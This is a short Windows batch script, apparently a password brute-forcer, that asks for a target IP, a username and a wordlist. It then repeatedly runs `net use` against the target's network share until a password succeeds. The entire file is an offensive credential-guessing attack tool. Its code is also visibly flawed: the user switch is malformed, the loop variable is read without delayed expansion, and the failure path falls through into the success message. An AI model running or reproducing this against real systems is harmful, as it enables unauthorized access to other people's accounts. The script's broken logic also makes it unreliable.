@echo off
set /p ip="Enter Ip Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "
for /f %%a in (%wordlist%) do (
  echo %%a
  set pass=%%a
  call :attempt
)
echo Password Not Found :(

:success
echo Password Found!: %pass%
net use  \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /%user% %pass% >nul 2>&1
echo attempt: %pass%
if %errorlevel% EQU 0 goto success